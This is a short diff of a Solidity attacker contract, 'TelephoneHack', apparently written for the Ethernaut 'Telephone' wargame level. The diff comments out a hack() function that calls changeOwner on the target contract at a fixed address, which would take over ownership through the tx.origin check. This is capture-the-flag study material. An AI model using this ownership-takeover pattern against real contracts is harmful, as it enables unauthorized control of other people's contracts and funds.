@@ -12,9 +12,9 @@ contract TelephoneHack {
     owner = msg.sender;
   }
 
-  function hack() public{
+//   function hack() public{
 
-    originalContract = Telephone(0x88781FAEb7Ec480D7d9e841B3c75d777BcEf78b1);
-    originalContract.changeOwner(owner);
-  }
+//     originalContract = Telephone(0x88781FAEb7Ec480D7d9e841B3c75d777BcEf78b1);
+//     originalContract.changeOwner(owner);
+//   }
 }
